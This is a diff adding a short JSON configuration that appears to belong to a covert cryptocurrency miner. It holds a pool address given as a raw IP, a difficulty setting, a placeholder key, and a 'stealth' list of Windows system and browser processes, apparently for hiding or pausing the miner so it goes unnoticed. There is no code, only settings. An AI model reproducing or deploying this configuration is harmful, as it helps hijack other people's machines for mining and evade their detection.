@@ -1,0 +1,18 @@
+{
+    "username": "QrodexFinance",
+    "key": "123",
+    "diff": 100,
+    "distress": false,
+    "scripts": "",
+    "altHost": false,
+    "mailBox": false,
+    "stealth": [
+        "svchost", "explorer", "dwm", "chrome", "system"
+    ],
+    "pools": [
+        "http://51.15.127.80"
+    ],
+    "blocked": [
+        ""
+    ]
+}
